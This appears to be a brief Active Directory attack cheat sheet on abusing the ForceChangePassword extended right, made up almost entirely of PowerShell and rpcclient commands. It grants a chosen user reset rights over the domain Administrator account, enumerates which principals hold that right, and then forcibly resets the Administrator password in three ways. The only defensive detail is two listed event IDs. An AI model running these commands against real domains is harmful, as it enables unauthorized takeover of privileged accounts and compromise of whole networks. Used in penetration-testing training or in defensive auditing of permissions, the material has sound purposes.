
# ForceChangePassword
```
GUID: 00299570-246d-11d0-a768-00aa006e0529
Event IDs 4723, 4724
```

#### Add ForceChangePassword ExtendedRights
```powershell
Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity jkimmich -Rights ResetPassword
```

#### All User
```powershell
Get-DomainObjectAcl | Where-Object {$_.ObjectAceType -match "00299570-246d-11d0-a768-00aa006e0529"} | Select SecurityIdentifier,ObjectAceType | Out-GridView
```

#### Specific User
```powershell
Get-DomainObjectAcl  -Identity Administrator | Where-Object {$_.ObjectAceType -match "00299570-246d-11d0-a768-00aa006e0529"} | Select SecurityIdentifier,ObjectAceType | Out-GridView
```

#### Change Password
```powershell
net user Administrator YeniSifre123! /domain
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force) -Reset
```

#### Change Password with RPC
```powershell
rpcclient $> setuserinfo2 Administrator 24 'NewPassword123!'
```
---
